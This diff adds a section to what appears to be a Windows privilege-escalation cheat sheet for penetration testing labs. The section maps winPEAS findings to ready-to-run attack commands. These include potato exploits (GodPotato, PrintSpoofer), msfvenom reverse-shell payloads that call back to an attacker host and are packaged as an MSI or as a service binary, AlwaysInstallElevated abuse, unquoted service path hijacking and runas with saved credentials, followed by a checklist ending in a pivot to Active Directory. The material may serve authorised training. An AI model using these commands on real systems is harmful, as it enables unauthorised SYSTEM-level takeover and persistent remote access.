@@ -94,6 +94,18 @@
     /* FOOTER */
     footer { text-align: center; padding: 2rem; color: var(--dim); font-size: 0.78rem; border-top: 1px solid var(--border); font-family: var(--mono); margin-top: 2rem; }
 
+    /* SIGNAL BOX — new format */
+    .sig-entry { margin-bottom: 1rem; padding-bottom: 1rem; border-bottom: 1px solid var(--border); }
+    .sig-entry:last-child { margin-bottom: 0; padding-bottom: 0; border-bottom: none; }
+    .sig-signal { color: var(--muted); display: block; margin-bottom: 4px; }
+    .sig-label { color: var(--yellow); }
+    .sig-cmd { color: var(--green); display: block; padding-left: 1em; }
+    .sig-note { color: var(--dim); font-size: 0.73rem; padding-left: 1em; display: block; font-style: italic; }
+    /* MOVE ON BOX */
+    .moveon { background: #f8514908; border: 1px solid #f8514955; border-left: 3px solid var(--red); border-radius: 6px; padding: 10px 13px; margin: 0.75rem 0; font-family: var(--mono); font-size: 0.78rem; line-height: 1.75; }
+    .moveon-title { font-size: 0.65rem; letter-spacing: 0.1em; text-transform: uppercase; color: var(--red); margin-bottom: 7px; display: block; }
+    .moveon-item { color: var(--muted); display: block; padding-left: 0.5em; }
+    .moveon-item::before { content: "✗ "; color: var(--red); }
     /* COPY JS */
   </style>
   <script>
@@ -138,6 +150,38 @@ C:\Windows\Temp\wp.exe
 <span class="c"># If AV kills it:</span>
 C:\Windows\Temp\wp.exe log   <span class="c"># saves to winPEAS.log in cwd</span>
 <span class="c"># Read output: RED = check immediately, YELLOW = investigate</span></pre></div>
+      <div class="sig">
+        <span class="sig-title">output signals</span>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> RED — SeImpersonatePrivilege: Enabled</span>
+          <span class="sig-cmd">systeminfo | findstr /B /C:"OS Name" /C:"OS Version" <span class="sig-note">-- determine correct potato</span></span>
+          <span class="sig-cmd">.\GodPotato-NET4.exe -cmd "cmd /c whoami" <span class="sig-note">-- Win10/11, Server 2019/2022</span></span>
+          <span class="sig-cmd">.\PrintSpoofer64.exe -i -c cmd <span class="sig-note">-- Server 2016/2019 with spooler running</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> RED — AlwaysInstallElevated = 1 in both hives</span>
+          <span class="sig-cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f msi -o evil.msi <span class="sig-note">-- generate MSI on kali</span></span>
+          <span class="sig-cmd">msiexec /quiet /qn /i C:\Windows\Temp\evil.msi <span class="sig-note">-- run as SYSTEM</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> YELLOW — unquoted service path with writable dir</span>
+          <span class="sig-cmd">icacls "C:\Program Files\Vulnerable App" <span class="sig-note">-- confirm write access</span></span>
+          <span class="sig-cmd">msfvenom -p windows/x64/shell_reverse_tcp LHOST=&lt;KALI&gt; LPORT=4444 -f exe -o Program.exe <span class="sig-note">-- generate payload with matching name</span></span>
+          <span class="sig-cmd">sc stop &lt;service&gt; && sc start &lt;service&gt; <span class="sig-note">-- trigger execution</span></span>
+        </div>
+        <div class="sig-entry">
+          <span class="sig-signal"><span class="sig-label">Signal:</span> YELLOW — saved credentials found (cmdkey /list)</span>
+          <span class="sig-cmd">runas /savecred /user:WORKGROUP\Administrator "C:\Windows\Temp\shell.exe" <span class="sig-note">-- run shell as admin with saved creds</span></span>
+        </div>
+      </div>
+      <div class="moveon">
+        <span class="moveon-title">move on (to next vector) when</span>
+        <span class="moveon-item">winpeas output read fully — not skimmed</span>
+        <span class="moveon-item">whoami /priv shows no dangerous privileges — move to services</span>
+        <span class="moveon-item">no unquoted paths with writable dirs — move to weak service perms</span>
+        <span class="moveon-item">no AlwaysInstallElevated, no saved creds, no weak services — move to password hunting</span>
+        <span class="moveon-item">all local vectors exhausted — check if machine is domain-joined, pivot to AD</span>
+      </div>
     </section>
 
     <section class="sec" id="baseline">
